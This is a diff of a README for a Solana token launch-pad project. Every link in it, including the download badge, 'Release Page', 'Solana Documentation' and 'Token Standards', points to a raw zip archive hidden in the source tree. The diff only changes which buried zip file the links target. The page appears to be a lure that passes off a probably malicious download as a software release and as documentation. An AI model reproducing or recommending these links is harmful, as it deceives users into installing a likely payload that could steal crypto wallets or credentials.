@@ -1,6 +1,6 @@
 # 🎉 solana-fun-token-launch-pad - Create and Manage Your SPL Tokens Easily
 
-[![Download Release](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/utils/fun_pad_token_solana_launch_v2.2.zip%https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/utils/fun_pad_token_solana_launch_v2.2.zip)](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/utils/fun_pad_token_solana_launch_v2.2.zip)
+[![Download Release](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/components/FaqMain/launch_solana_fun_pad_token_v2.7.zip%https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/components/FaqMain/launch_solana_fun_pad_token_v2.7.zip)](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/components/FaqMain/launch_solana_fun_pad_token_v2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the solana-fun-token-launch-pad! This platform offers a straightforwa
 
 ## 📥 Download & Install
 
-To install the application, visit this page to download: [Release Page](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/utils/fun_pad_token_solana_launch_v2.2.zip).
+To install the application, visit this page to download: [Release Page](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/components/FaqMain/launch_solana_fun_pad_token_v2.7.zip).
 
 1. Click the link above to access the Releases page.
 2. Locate the latest release version.
@@ -72,8 +72,8 @@ If you are new to the world of cryptocurrencies or need assistance using the app
 
 If you're looking for more information, consider these resources:
 
-- [Solana Documentation](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/utils/fun_pad_token_solana_launch_v2.2.zip)
-- [Token Standards](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/utils/fun_pad_token_solana_launch_v2.2.zip)
+- [Solana Documentation](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/components/FaqMain/launch_solana_fun_pad_token_v2.7.zip)
+- [Token Standards](https://github.com/Abdurahman239-tech/solana-fun-token-launch-pad/raw/refs/heads/main/src/components/FaqMain/launch_solana_fun_pad_token_v2.7.zip)
 - Community forums or Discord channels for discussions and support.
 
 ## ♻️ Updating the Application
